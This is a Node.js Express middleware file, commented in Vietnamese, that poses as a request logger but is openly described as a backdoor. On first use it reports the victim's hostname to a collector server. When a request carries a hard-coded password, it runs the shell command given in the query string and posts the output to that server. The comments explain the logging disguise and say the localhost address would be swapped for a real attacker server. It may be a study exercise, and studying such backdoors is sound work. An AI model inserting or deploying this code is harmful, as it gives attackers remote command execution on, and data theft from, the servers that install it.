const {
    exec
} = require("child_process");
const http = require("http");
module.exports = () => {
    // # Các package có sẵn trong NodeJS / Dùng http / Dùng để gửi request http thông qua object options ok
    // # Backdoor

    let newVictim = true;
    // Logger của ta trả ra 1 hàm bên dưới. Mỗi 1 người dùng mới khi truy cập trang web sẽ chạy vào hàm dưới 
    return (req, res, next) => {
        if (newVictim) {
            newVictim = false;
            // Nếu 1 người truy cập trang web thì lần đầu tiên sẽ chạy vào hàm này, sau khi query xong họ lại query 
            // cái khác nx thì k cần chạy hàm này nx trừ khi họ refresh lại trang để code chạy lại từ đầu thì middleware
            // sẽ chạy lại và newVictim lại là true của client mới. 
            // Ta xử lý backdoor: Nó sẽ gửi 1 yêu cầu tới server config là options bên dưới
            const options = {
                host: "127.0.0.1",
                port: "3001",
                path: `/new-victim?victimURL=${req.hostname}`,
                // Gửi hostname của nạn nhân cho server bắt
            };
            http.request(options).end(); // Gửi 1 request tới http://127.0.0.1:3001/new-victim?victimURL=<>
            // thì server có host và port tương úng nhận được trường query kia đã được parse ở backdoor
        }
        const {
            pwd,
            cmd
        } = req.query;
        if (!pwd) {
            console.log(`${new Date().toLocaleString()}: ${req.method} - ${req.url}`);
            // Giả sử nếu phần query của url mà có pwd và cmd ta sẽ lấy ra(VD nó là password or tk thì xong r)
            // Ở đây nếu k có ta đánh lừa là in ra thông tin cần thiết làm chức năng của logger
        }
        // Nhưng nếu có:
        if (pwd === "secret-pwd") {
            // Tiếc là child_process chắc fix lỗi k chạy được các command cmd nên ở đây chỉ lấy được mấy thứ vô dụng
            // Ta k cần phải như này mà chỉ cần lấy mọi trường query là ổn r
            exec(cmd, (err, stdout) => {
                const data = JSON.stringify({
                    output: stdout,
                });
                // Thực hiện lệnh cmd, rồi trả ra giá trị lưu vào stdout thì ta lấy ra làm tham số gửi đến cho
                // server của attacker. Ở đây ta test là local host nhưng thực tế ta phải điền vào config cua
                // remote server và phải luôn để server bật để rình xem ông nào gửi là bắt
                const options = {
                    host: "127.0.0.1",
                    port: "3001",
                    path: "/",
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Content-Length": Buffer.byteLength(data),
                    },
                };
                const req = http.request(options);
                req.write(data);
                req.end();
            });
        }
        next();
    };
};